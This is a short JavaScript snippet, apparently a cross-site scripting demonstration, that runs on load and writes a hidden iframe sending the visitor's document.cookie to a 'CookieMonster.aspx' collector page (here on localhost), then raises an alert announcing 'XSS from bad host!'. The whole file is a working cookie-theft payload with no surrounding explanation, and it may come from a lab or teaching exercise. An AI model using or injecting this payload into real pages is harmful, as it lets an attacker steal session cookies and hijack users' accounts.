function AttackIFrame() {
    var s = '<iframe style="display:block; width:350px;hegth:350px;" src="http://localhost:1436/CookieMonster.aspx?c=' + escape(document.cookie) + '"></iframe>';
    document.write(s);
    alert('XSS from bad host! AttackFution');
};

AttackIFrame();